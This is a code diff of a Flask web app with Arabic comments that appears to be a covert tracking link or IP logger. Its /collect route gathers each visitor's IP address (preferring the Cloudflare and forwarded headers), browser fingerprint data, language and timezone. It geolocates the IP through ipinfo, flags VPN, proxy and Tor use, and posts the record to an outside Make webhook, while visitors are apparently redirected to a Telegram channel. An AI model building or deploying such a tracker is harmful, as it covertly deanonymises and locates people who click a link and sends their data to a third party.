@@ -5,10 +5,10 @@ import json
 import os
 
 app = Flask(__name__)
-
-REDIRECT_URL = "https://t.me/YourChannel"
-MAKE_WEBHOOK = os.environ.get("MAKE_WEBHOOK") or "https://hook.eu2.make.com/xxxxxxx"
-IPINFO_TOKEN = os.environ.get("IPINFO_TOKEN") or "ضع_التوكن_الخاص_بك"
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+MAKE_WEBHOOK = os.environ.get("MAKE_WEBHOOK")
+REDIRECT_URL = os.environ.get("TRACK_URL")
+IPINFO_TOKEN = os.environ.get("IPINFO_TOKEN")
 
 @app.route('/')
 def home():
@@ -22,14 +22,22 @@ def track():
 @app.route('/collect', methods=['POST'])
 def collect():
     js_data = request.get_json()
-    ip_raw = request.headers.get('X-Forwarded-For', request.remote_addr)
-    ip = ip_raw.split(",")[0].strip()
+
+    # ========== استخراج أدق IP ==========
+    ip = (
+        request.headers.get("CF-Connecting-IP") or
+        request.headers.get("X-Forwarded-For", "").split(",")[0].strip() or
+        request.remote_addr
+    )
+
     user_agent = request.headers.get('User-Agent', '')
     language = request.headers.get('Accept-Language', '')
 
-    # تحليل بيانات ipinfo.io
+    # ========== تحليل ipinfo ==========
     try:
-        geo = requests.get(f"https://ipinfo.io/{ip}?token={IPINFO_TOKEN}", timeout=5).json()
+        geo_response = requests.get(f"https://ipinfo.io/{ip}?token={IPINFO_TOKEN}", timeout=5)
+        geo = geo_response.json()
+
         city = geo.get("city", "N/A")
         region = geo.get("region", "N/A")
         country = geo.get("country", "N/A")
@@ -41,16 +49,18 @@ def collect():
         is_tor = privacy.get("tor", False)
 
     except Exception as e:
+        print("[IPINFO ERROR]", str(e))
+        geo = {}
         city = region = country = org = "N/A"
         is_vpn = is_proxy = is_tor = False
 
-    # بيانات من JavaScript
+    # ========== بيانات الجافا سكربت ==========
     platform = js_data.get("platform", "")
     timezone = js_data.get("timezone", "")
     local_time = js_data.get("localTime", "")
     screen = js_data.get("screen", "")
 
-    # دمج البيانات
+    # ========== دمج البيانات ==========
     data = {
         "ip": ip,
         "userAgent": user_agent,
@@ -72,7 +82,7 @@ def collect():
         "timestamp": datetime.now().isoformat()
     }
 
-    # إرسال إلى Make
+    # ========== إرسال إلى Make ==========
     if MAKE_WEBHOOK:
         try:
             requests.post(MAKE_WEBHOOK, json=data, timeout=3)
@@ -86,7 +96,7 @@ def collect():
 def static_files(filename):
     return send_from_directory('static', filename)
 
-if __name__ == '__main__': 
+if __name__ == '__main__':
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
 
